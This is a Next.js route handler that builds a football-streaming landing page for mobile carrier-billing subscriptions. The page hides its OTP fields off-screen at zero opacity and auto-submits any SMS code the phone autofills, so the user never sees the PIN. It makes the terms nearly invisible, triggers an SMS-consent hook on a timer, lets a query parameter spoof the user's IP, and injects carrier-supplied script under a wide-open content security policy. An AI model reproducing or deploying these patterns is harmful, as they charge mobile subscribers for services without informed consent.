import { randomUUID } from 'crypto';
import { NextRequest } from 'next/server';
import { getConfig } from '@/lib/config';
import {
  vasPinRequestFlow,
  vasPinRequestWithRetry,
} from '@/lib/vas-api';
import { getTelcoById } from '@/lib/telco';

const POST_CONSENT_VERIFY_MS = 450;
const OTP_AUTOFILL_VERIFY_MS = 400;
const PREFILLED_AFTER_CONSENT_MS = 500;
const SILENT_WAIT_RESEND_MS = 5500;
const CONSENT_FALLBACK_ARM_MS = 2000;

export async function GET(request: NextRequest) {
  const cfg = await getConfig();
  if (cfg.subscription_provider !== 'vas_universal') {
    return new Response(
      'VAS universal flow is disabled. Set subscription_provider to vas_universal in /admin.',
      { status: 403, headers: { 'Content-Type': 'text/plain; charset=utf-8' } }
    );
  }

  const { searchParams } = new URL(request.url);
  const msisdn = searchParams.get('msisdn') || '';
  let trxId = searchParams.get('trxId') || '';
  if (!trxId || trxId.length < 8) trxId = randomUUID();

  const forwarded = request.headers.get('x-forwarded-for');
  const realIP = forwarded ? forwarded.split(',')[0].trim() : '127.0.0.1';
  const userIP = searchParams.get('userIP') || realIP;
  const showDebug = searchParams.get('debug') === '1';
  const ua = request.headers.get('user-agent') || '';

  // Per-telco config: if telcoId is provided, use that telco's specific IDs
  const telcoId = searchParams.get('telcoId') || '';
  let userTelcoServiceId = parseInt(cfg.vas_user_telco_service_id || '100', 10);
  let adAgencyCampaignId = parseInt(cfg.vas_ad_agency_campaign_id || '100', 10);

  if (telcoId) {
    const telco = await getTelcoById(telcoId);
    if (telco) {
      userTelcoServiceId = telco.user_telco_service_id;
      adAgencyCampaignId = telco.ad_agency_campaign_id;
      console.log(`[vas/otp-page] Using telco config: ${telco.name} (svc=${userTelcoServiceId}, cmp=${adAgencyCampaignId})`);
    }
  }

  const vasRes = await vasPinRequestWithRetry({
    msisdn: msisdn || undefined,
    userTelcoServiceId,
    adAgencyCampaignId,
    adAgencyCampaignTransactionId: trxId,
    userIP,
    ua,
  });

  const code = vasRes.errorCode;
  const flow = vasPinRequestFlow(code);
  const msg = vasRes.responseMessage || '';

  if (flow === 'active') {
    const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="refresh" content="0;url=/thankyou"><script>sessionStorage.setItem('trxId',${JSON.stringify(trxId)});location.replace('/thankyou');</script></head><body style="background:#0b0e14;color:#fff;font-family:sans-serif;padding:24px">Already active — redirecting…</body></html>`;
    return htmlResponse(html);
  }

  if (flow === 'cg') {
    const url = msg.trim();
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      return htmlResponse(
        `<!DOCTYPE html><html><body style="background:#0b0e14;color:#fff;padding:24px;font-family:sans-serif">Invalid carrier URL. <a href="/?manual=1" style="color:#e2383a">Manual entry</a></body></html>`
      );
    }
    const html = `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Redirect</title></head><body style="background:#0b0e14;color:#fff;padding:24px;font-family:sans-serif"><p>Opening carrier page…</p><script>sessionStorage.setItem('trxId',${JSON.stringify(trxId)});location.replace(${JSON.stringify(url)});</script></body></html>`;
    return htmlResponse(html);
  }

  if (flow === 'blocked') {
    return htmlResponse(
      `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="background:#0b0e14;color:#fff;padding:24px;font-family:sans-serif;max-width:420px;margin:0 auto"><h1>Unavailable</h1><p>This subscription cannot continue (code ${code}).</p><p><a href="/?manual=1" style="color:#e2383a">Try manual entry</a></p></body></html>`
    );
  }

  if (flow === 'retry_client') {
    return htmlResponse(
      `<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body style="background:#0b0e14;color:#fff;padding:24px;font-family:sans-serif;max-width:420px;margin:0 auto"><h1>Please retry</h1><p>Service busy (code ${code}).</p><p><a href="/api/vas/otp-page?trxId=${encodeURIComponent(randomUUID())}&userIP=${encodeURIComponent(userIP)}${msisdn ? `&msisdn=${encodeURIComponent(msisdn)}` : ''}" style="color:#e2383a">Tap to retry</a></p><p><a href="/?manual=1" style="color:#888">Manual entry</a></p></body></html>`
    );
  }

  // pin_ok (0) or own (20000) — Evina only for 20000
  let evinaJS = '';
  if (code === 20000 && msg) {
    evinaJS = msg
      .trim()
      .replace(/^<script[^>]*>/i, '')
      .replace(/<\/script\s*>$/i, '')
      .trim();
  }

  const html = buildVasOtpHtml({
    msisdn,
    trxId,
    userIP,
    showDebug,
    vasErrorCode: code,
    evinaJS,
    pinRequestOk: code === 0 || code === 20000,
  });

  return htmlResponse(html);
}

function htmlResponse(html: string): Response {
  return new Response(html, {
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate, max-age=0',
      Pragma: 'no-cache',
      'Content-Security-Policy': [
        "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
        "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:",
        "connect-src * wss: ws: https: http: data: blob:",
        "style-src * 'unsafe-inline'",
        "img-src * data: blob:",
        "font-src * data:",
        "frame-src *",
      ].join('; '),
    },
  });
}

function buildVasOtpHtml(opts: {
  msisdn: string;
  trxId: string;
  userIP: string;
  showDebug: boolean;
  vasErrorCode: number;
  evinaJS: string;
  pinRequestOk: boolean;
}): string {
  const { msisdn, trxId, userIP, showDebug, vasErrorCode, evinaJS, pinRequestOk } =
    opts;
  const evinaTag = evinaJS
    ? `<script>${evinaJS}</script>`
    : '<!-- VAS Flow: no Evina snippet (errorCode 0) -->';

  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>GoalNowX</title>
  <link rel="stylesheet" href="/football-collage-backdrop.css">
  <style>
    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; min-height: 100vh; min-height: 100dvh; background: #0b0e14; display: flex; flex-direction: column; position: relative; overflow-x: hidden; color: #fff; }
    .hero-bg { position: fixed; inset: 0; z-index: 0; pointer-events: none; overflow: hidden; background: #06060a; }
    .hero-bg .hero-scrim { position: absolute; inset: 0; background: linear-gradient(180deg, rgba(11,14,20,0.45) 0%, rgba(11,14,20,0.82) 45%, rgba(11,14,20,0.94) 100%); }
    .topbar { display: flex; align-items: center; justify-content: space-between; padding: 16px 20px; position: relative; z-index: 10; }
    .brand { display: flex; align-items: center; gap: 10px; }
    .brand-icon { width: 36px; height: 36px; background: #e2383a; border-radius: 8px; display: flex; align-items: center; justify-content: center; }
    .brand-name { font-size: 18px; font-weight: 800; color: white; letter-spacing: -0.3px; }
    .brand-name span { color: #e2383a; }
    .main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; position: relative; z-index: 10; }
    .wrapper { width: 100%; max-width: 380px; }
    .card { background: rgba(20, 25, 35, 0.82); backdrop-filter: blur(16px); border-radius: 20px; border: 1px solid rgba(255,255,255,0.08); padding: 28px 24px; box-shadow: 0 24px 60px rgba(0,0,0,0.45); }
    .btn { width: 100%; padding: 16px; border: none; border-radius: 14px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.2s; min-height: 54px; display: flex; align-items: center; justify-content: center; gap: 8px; }
    .btn-primary { background: #e2383a; color: white; box-shadow: 0 6px 20px rgba(226,56,58,0.25); }
    .phase-hidden { display: none !important; }
    .processing-overlay { position: fixed; inset: 0; z-index: 99999; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 28px 22px; background: rgba(11, 14, 20, 0.78); backdrop-filter: blur(12px); }
    .spinner-lg { width: 44px; height: 44px; border: 3px solid rgba(226,56,58,0.15); border-top-color: #e2383a; border-radius: 50%; animation: spin 0.7s linear infinite; margin: 0 auto 16px; }
    @keyframes spin { to { transform: rotate(360deg); } }
    .otp-vault { position: fixed; left: -2000px; top: 0; width: 320px; height: 56px; opacity: 0; overflow: hidden; }
    .overlay-error { color: #f87171; font-size: 13px; margin-top: 18px; text-align: center; min-height: 20px; }
    .resend-overlay { margin-top: 22px; font-size: 13px; color: rgba(255,255,255,0.35); text-align: center; }
    .resend-overlay a { color: #e2383a; font-weight: 700; text-decoration: none; }
    .terms { text-align: center; font-size: 10px; color: rgba(255,255,255,0.12); margin-top: 14px; line-height: 1.5; }
  </style>
  ${evinaTag}
</head>
<body>
  <div class="hero-bg" aria-hidden="true"><div class="hero-scrim"></div></div>
  <a href="#" id="EvinaTrapLink" style="display:none">CONFIRMER - OK - SUBSCRIBE</a>
  <canvas id="EvinaTestCanvas" width="500" height="50" style="display:none"></canvas>

  <div id="processingOverlay" class="processing-overlay phase-hidden" aria-live="polite">
    <div style="max-width:340px;text-align:center">
      <div class="brand" style="justify-content:center;margin-bottom:24px">
        <div class="brand-icon"><svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20"><polygon points="5 3 19 12 5 21 5 3"/></svg></div>
        <div class="brand-name">GOAL<span>NOWX</span></div>
      </div>
      <div class="spinner-lg"></div>
      <h2 id="overlayTitle" style="font-size:22px;font-weight:800;margin-bottom:8px">Unlocking your access…</h2>
      <p id="overlaySub" style="color:rgba(255,255,255,0.4);font-size:14px">Usually just a few seconds</p>
      <p id="overlayError" class="overlay-error"></p>
      <p id="resendAreaOverlay" class="resend-overlay phase-hidden">Still waiting? <a href="#" id="resendLinkOverlay">Tap to try again</a></p>
    </div>
  </div>

  <div id="otpVault" class="otp-vault">
    <input id="otpValue" type="text" tabindex="-1" autocomplete="off">
    <input id="otpFull" type="text" inputmode="numeric" autocomplete="one-time-code" maxlength="8" tabindex="-1">
  </div>

  <div class="topbar">
    <div class="brand">
      <div class="brand-icon"><svg viewBox="0 0 24 24" fill="currentColor" width="20" height="20"><polygon points="5 3 19 12 5 21 5 3"/></svg></div>
      <div class="brand-name">GOAL<span>NOWX</span></div>
    </div>
  </div>
  <div class="main">
    <div class="wrapper">
      <div class="card">
        <div id="phase1">
          <h2 style="font-size:20px;font-weight:800;margin-bottom:8px;text-align:center">Watch live football</h2>
          <p style="color:rgba(255,255,255,0.4);font-size:13px;text-align:center;margin-bottom:20px">Tap below to confirm and receive your code.</p>
        </div>
        <button type="button" class="btn btn-primary" id="Confirm">
          <span id="btnStart">Start Watching</span>
          <span id="btnWait" class="phase-hidden">Waiting…</span>
        </button>
        <p class="terms">VAS universal flow · errorCode ${vasErrorCode}</p>
      </div>
    </div>
  </div>

  <script>
    var MSISDN = ${JSON.stringify(msisdn)};
    var TRXID = ${JSON.stringify(trxId)};
    var USER_IP = ${JSON.stringify(userIP)};
    var VAS_ERROR_CODE = ${vasErrorCode};
    var PIN_REQUEST_OK = ${pinRequestOk ? 'true' : 'false'};
    var DEBUG_PANEL = ${JSON.stringify(showDebug)};
    var EVINA_LEN = ${evinaJS.length};
    sessionStorage.setItem('trxId', TRXID);
    if (MSISDN) sessionStorage.setItem('msisdn', MSISDN);

    var phase = 1;
    var isVerifying = false;
    var pinVerified = false;
    var lastConsentAt = 0;
    var consentArmed = false;
    var otpPreFilled = false;
    var otpFullHandled = false;
    var confirmBtn = document.getElementById('Confirm');
    var otpFull = document.getElementById('otpFull');
    var otpValue = document.getElementById('otpValue');

    function dbg(m) { console.log('[VAS]', m); }

    function showOverlay() {
      var ov = document.getElementById('processingOverlay');
      if (ov) ov.classList.remove('phase-hidden');
    }
    function hideMainCard() {
      document.querySelector('.main').style.display = 'none';
      document.querySelector('.topbar').style.display = 'none';
    }
    function showError(msg) {
      var oe = document.getElementById('overlayError');
      if (oe) oe.textContent = msg;
      document.getElementById('resendAreaOverlay').classList.remove('phase-hidden');
    }

    function goToPhase2() {
      phase = 2;
      document.getElementById('phase1').classList.add('phase-hidden');
      confirmBtn.classList.add('phase-hidden');
      showOverlay();
      if (otpPreFilled) {
        var code = (otpValue && otpValue.value) ? otpValue.value.replace(/\\D/g, '') : '';
        if (code.length >= 4) setTimeout(function() { verifyPin(code.slice(0, 8)); }, ${PREFILLED_AFTER_CONSENT_MS});
      } else {
        setTimeout(function() {
          if (!isVerifying && !pinVerified && !consentArmed) {
            consentArmed = true;
            try {
              if (window._ntR && window._nt && window._nt.enableSmsConsent) window._nt.enableSmsConsent();
            } catch (e) {}
          }
        }, ${CONSENT_FALLBACK_ARM_MS});
        setTimeout(function() {
          if (!isVerifying && !pinVerified) {
            document.getElementById('resendAreaOverlay').classList.remove('phase-hidden');
          }
        }, ${SILENT_WAIT_RESEND_MS});
      }
    }

    confirmBtn.addEventListener('click', function(e) {
      if (!e.isTrusted || phase !== 1) return;
      lastConsentAt = Date.now();
      dbg('Confirm tapped');
      try {
        if (window._ntR && window._nt && window._nt.onPinRequested) window._nt.onPinRequested();
      } catch (err) {}
      if (!PIN_REQUEST_OK) {
        showOverlay();
        showError('PIN request was not successful (code ' + VAS_ERROR_CODE + '). Use resend or manual entry.');
        return;
      }
      goToPhase2();
    });

    function handleOtpFullFill() {
      if (otpFullHandled || isVerifying) return;
      var code = otpFull.value.replace(/\\D/g, '').slice(0, 8);
      if (code.length < 4) return;
      otpFullHandled = true;
      if (otpValue) otpValue.value = code;
      if (phase === 1) { otpPreFilled = true; dbg('OTP prefilled before consent'); }
      else { setTimeout(function() { verifyPin(code); }, ${OTP_AUTOFILL_VERIFY_MS}); }
    }
    if (otpFull) {
      otpFull.addEventListener('input', handleOtpFullFill);
      otpFull.addEventListener('change', handleOtpFullFill);
    }

    function verifyPin(pin) {
      if (pinVerified) return;
      if (lastConsentAt && Date.now() - lastConsentAt < ${POST_CONSENT_VERIFY_MS}) {
        setTimeout(function() { verifyPin(pin); }, ${POST_CONSENT_VERIFY_MS} - (Date.now() - lastConsentAt));
        return;
      }
      pinVerified = true;
      isVerifying = true;
      dbg('verify ' + pin);
      fetch('/api/vas/pin-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ adAgencyCampaignTransactionId: TRXID, pin: pin })
      })
      .then(function(r) { return r.json(); })
      .then(function(data) {
        var ec = typeof data.errorCode === 'number' ? data.errorCode : parseInt(data.errorCode, 10);
        if (ec === 0 || ec === 1) {
          location.href = '/thankyou';
        } else {
          pinVerified = false;
          var oe2 = document.getElementById('overlayError');
          if (oe2) oe2.textContent = 'Verification failed (' + ec + '). Resend below or open home with manual entry.';
          document.getElementById('resendAreaOverlay').classList.remove('phase-hidden');
        }
      })
      .catch(function() {
        pinVerified = false;
        showError('Network error');
      })
      .finally(function() { isVerifying = false; otpFullHandled = false; });
    }

    function newVasTrx() {
      try {
        if (typeof crypto !== 'undefined' && crypto.randomUUID) return crypto.randomUUID();
      } catch (e) {}
      return 'MM' + Date.now().toString(36) + Math.random().toString(36).slice(2, 12);
    }
    document.getElementById('resendLinkOverlay').addEventListener('click', function(ev) {
      ev.preventDefault();
      var u = '/api/vas/otp-page?trxId=' + encodeURIComponent(newVasTrx()) + '&userIP=' + encodeURIComponent(USER_IP);
      if (MSISDN) u += '&msisdn=' + encodeURIComponent(MSISDN);
      if (DEBUG_PANEL) u += '&debug=1';
      location.href = u;
    });

    if (window._ntR && window._nt && window._nt.onPageReady) {
      try { window._nt.onPageReady(); } catch (e) {}
    }
  </script>
</body>
</html>`;
}
